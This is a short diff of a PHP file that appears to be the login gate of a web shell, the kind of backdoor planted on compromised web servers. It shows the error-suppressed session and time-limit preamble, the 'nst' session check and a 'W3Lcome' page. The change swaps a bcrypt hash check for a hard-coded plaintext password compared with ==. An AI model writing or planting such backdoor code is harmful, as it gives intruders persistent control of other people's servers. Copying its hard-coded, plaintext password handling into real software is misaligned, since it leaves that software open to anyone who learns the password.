@@ -2,21 +2,24 @@
 @session_start();
 @set_time_limit(0);
 
-// PASSWORD CONFIGURATION
+//PASSWORD CONFIGURATION
+
 @$pass = $_POST['pass'];
 $chk_login = true;
-$hashed_password = '$2y$10$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36IMq2Bzskvsq7cdEc9lbF2'; // Hash dari password yang disimpan
+$password = "good121";
 
-// END CONFIGURATION
+//END CONFIGURATION
 
-// Memeriksa apakah password yang dimasukkan sesuai dengan hash yang disimpan
-if (password_verify($pass, $hashed_password)) {
-    $_SESSION['nst'] = $hashed_password; // Menyimpan hash password ke sesi
+if($pass == $password)
+{
+ $_SESSION['nst'] = "$pass";
 }
 
-if ($chk_login == true) {
-    if (!isset($_SESSION['nst']) || $_SESSION['nst'] != $hashed_password) {
-        die("Password salah atau sesi tidak valid.");
+if($chk_login == true)
+{
+ if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
+ {
+ die("
   <title>W3Lcome</title>
   <center>
   <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
